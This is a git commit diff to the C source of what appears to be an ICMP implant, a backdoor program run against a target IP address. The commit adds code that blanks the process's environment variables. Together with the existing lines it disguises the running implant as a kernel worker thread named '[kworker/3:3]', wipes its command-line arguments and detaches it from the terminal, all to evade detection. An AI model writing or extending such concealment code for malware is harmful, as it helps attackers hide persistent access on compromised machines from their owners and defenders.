dd2c52773c59d1ce6e7365bfd17fff76c0b04034
g0rchy <92731777+g0rchy@users.noreply.github.com>
2023-01-23 21:51:09 +0100

    added environ purge

--- src/icmp-implant.c
+++ src/icmp-implant.c
@@ -1,6 +1,6 @@
 #include "../include/implant.h"
 
-int main(int argc, char **argv) {
+int main(int argc, char **argv, char **envp) {
     if (argc < 2) {
         fprintf(stderr, "Usage: ./icmp-implant [IP-ADDRESS]\n");
         return 1;
@@ -18,12 +18,17 @@ int main(int argc, char **argv) {
     ioctl(0, TIOCNOTTY);
 
     // save the arg for later
-    memmove(target, argv[1], ip_len + 1);
+    strncpy(target, argv[1], ip_len + 1);
 
     // process masquerading, change the command name associated with the process (/proc/<pid>/comm)
     prctl(PR_SET_NAME, "[kworker/3:3]", NULL, NULL, NULL);
     strncpy(argv[0], "[kworker/3:3]\0", strlen(argv[0]) + 1);
     strncpy(argv[1], "\0", strlen(argv[1]));
+
+    // kworker thread doesn't have any env variables
+    for (int i = 0; envp[i] != NULL; i++) {
+        strncpy(envp[i], "\0", strlen(envp[i]));
+    }
 
     implant_init_n_call(target);
     return 0;
